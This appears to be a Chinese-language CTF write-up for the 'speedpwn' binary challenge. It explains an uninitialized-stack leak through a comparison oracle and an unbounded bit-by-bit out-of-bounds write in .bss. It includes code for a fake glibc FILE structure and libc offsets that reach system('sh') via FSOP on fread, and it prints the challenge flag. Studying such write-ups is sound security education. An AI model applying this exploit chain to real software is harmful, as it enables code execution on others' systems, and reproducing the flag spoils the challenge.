# speedpwn

## 题目简述

程序让玩家与机器人比较两个 64 位整数。比较规则不是普通大小关系：先比较二进制中 1 的数量；数量相同时，再从最低位到最高位寻找第一个不同位，该位为 1 的一方获胜。程序还提供离线模拟、打印历史和重新播种功能。

利用链包含两个独立问题。模拟功能在 `scanf` 转换失败时继续使用未初始化的栈变量，可以把比较函数变成 libc 指针的判定预言机；真实对战把游戏结果按位写入 `game_history`，却没有限制游戏总数，因而能从 `.bss` 中的 `game_history` 开始进行连续逐位越界写。最终可在固定地址伪造 glibc `FILE`，通过 `fread` 触发 FSOP。

## 解题过程

### 1. 用比较预言机恢复 libc 地址

`simulate()` 没有检查 `scanf` 的返回值：

```c
unsigned long long bot_num, player_num;
scanf("%llu%*c", &bot_num);
scanf("%llu%*c", &player_num);
cmp(bot_num, player_num) ? puts("Bot win!") : puts("You win!");
```

给第一个输入发送 `-`，`%llu` 转换失败，`bot_num` 保留该栈槽原有内容。题目环境中这里残留一个 libc 地址。第二个数由选手控制，输出则给出隐藏值与查询值在 `cmp` 顺序下的比较结果。

`cmp` 的第一关键字是汉明重量 $\operatorname{popcount}(x)$，第二关键字是从最低位开始的字典序。因此可以分两步恢复隐藏值：

1. 用含有 $k$ 个 1 的数逐次查询，先确定隐藏值的汉明重量；
2. 固定相同的汉明重量，移动一个 1 与一个 0 的位置，通过最低不同位的胜负逐位确定所有置位位置。

官方脚本的 `get_leak()` 实现了这一过程，并根据用户态共享库地址的形式补回最高十六进制位 `7`。得到的值是 libc 内固定位置的地址：

```python
libc_leak = get_leak()
libc_base = libc_leak - 0x955c2
system    = libc_base + 0x58740
wfile_jumps = libc_base + 0x202228
```

这些偏移对应题目随附件提供的 glibc 2.39，不能直接套用到其他版本。

### 2. 把游戏结果变成连续位写

真实对战结束后，程序按游戏序号记录一位结果：

```c
uint64_t *dst = &game_history + number_of_games / 64;

if (win)
    *dst |= 1ULL << (number_of_games % 64);
else
    *dst &= ~(1ULL << (number_of_games % 64));

number_of_games++;
```

`.bss` 中相关符号的固定地址为：

```text
0x404080  number_of_games
0x404088  game_history
0x404090  seed
0x404098  seed_generator
```

前 64 局写 `game_history`，之后却继续覆盖 `seed`、`seed_generator` 以及更高地址，没有任何边界检查。每进行一局就向前推进一位，故可按小端、最低位优先的顺序写出任意字节流。

输赢也可以稳定控制。机器人由两次 `rand()` 拼接而成，最高位及若干边界位不会置上，汉明重量通常远小于 56；提交低 56 位全为 1 的 `0x00ffffffffffffff` 可稳定获胜，提交 `0` 则必败。官方 `do_write()` 按目标字节的每一位分别选择这两个数。

### 3. 在 .bss 伪造 FILE 结构

写入从 `0x404088` 开始。先写两个零 qword 覆盖 `game_history` 和 `seed`，再把 `seed_generator` 改成伪造文件对象地址 `0x4040a0`：

```python
got            = 0x404000
fake_file_addr = 0x4040a0
fake_wide_data = got + 0x180

payload  = p64(0) * 2
payload += p64(fake_file_addr)
payload += bytes(fake_file)
```

伪造 `_IO_FILE` 的关键字段如下：

```python
fake_file.flags          = u64(b"  sh\x00\x00\x00\x00")
fake_file._IO_write_base = 0
fake_file._IO_write_ptr  = 1
fake_file._wide_data     = fake_wide_data
fake_file._lock          = got + 0x200
fake_file.vtable         = wfile_jumps - 0x28
```

`_IO_write_ptr > _IO_write_base` 让宽字符路径满足必要状态；可写的 `_lock` 防止加锁崩溃；偏移后的 `_IO_wfile_jumps` 把 `fread` 调度到宽字符 underflow/缓冲区分配路径。伪造的 wide data 再把 `_wide_vtable->__doallocate` 对应槽位指向 `system`。

该回调接收的第一个参数正是 `FILE *`，所以把结构开头的 `_flags` 字节布置成字符串 `"  sh"` 后，最终效果就是：

```c
system((char *)fake_file);   // 等价于 system("  sh")
```

### 4. 通过重新播种触发

完成逐位写后选择 `r`。`reseed()` 会执行：

```c
fread((char *)&seed, 1, 8, seed_generator);
```

此时 `seed_generator` 已经指向伪造 `_IO_FILE`，`fread` 沿伪造 vtable 进入 `system("sh")`。获得 shell 后读取 `/home/user/flag.txt` 即可得到 flag。

仓库中服务端使用的 flag 为：

```text
SEKAI{congratz_you_beat_the_bot_and_hopefully_got_the_bounty!_1dee87}
```

## 方法总结

本题先利用未检查的输入转换，把未初始化栈值变成只有“胜负”输出的比较预言机；由于比较规则同时暴露汉明重量和最低位优先顺序，仍能完整恢复 libc 地址。随后利用没有上限的游戏历史索引，从静态 `game_history` 开始构造稳定的逐位任意写。

越界写只能从固定地址顺序前进，直接覆盖控制流并不方便，但 `.bss` 空间足够容纳完整的 `FILE`、wide data 和伪造 vtable。再把相邻的 `seed_generator` 指向它，现成的 `fread` 就成为 FSOP 触发点。这是“弱泄露 + 顺序位写”组合成完整代码执行的典型思路。
